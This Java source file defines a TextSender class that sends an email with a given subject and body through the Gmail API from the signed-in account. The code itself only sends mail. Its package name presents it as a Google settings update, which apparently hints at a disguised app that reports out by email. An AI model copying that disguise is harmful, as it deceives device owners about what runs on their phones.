package com.setting.dl.google.googlesettingupdate.ptt.senders;

import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.Message;
import com.setting.dl.google.googlesettingupdate.mail.gmail.Mail;
import com.setting.dl.google.googlesettingupdate.u;

import java.util.List;
import java.util.Objects;

public class TextSender implements ITextSender {
   
   @Override
   synchronized
   public Message sendText(Gmail gmail, String sender, List<String> recievers, String subject, String body) {
      
      if (subject == null || subject.trim().isEmpty()) {
         
         u.log.w("Geçersiz boş mesaj");
         return null;
      }
      
      try {
         
         return gmail
               .users()
               .messages()
               .send("me", Objects.requireNonNull(Mail.createMessageWithEmail(
                     Mail.createEmail(
                           recievers,
                           sender,
                           subject,
                           body)))).execute();
         
         
      }
      catch (Exception e) {
         
         e.printStackTrace();
      }
      
      return null;
   }
   
   
   
}

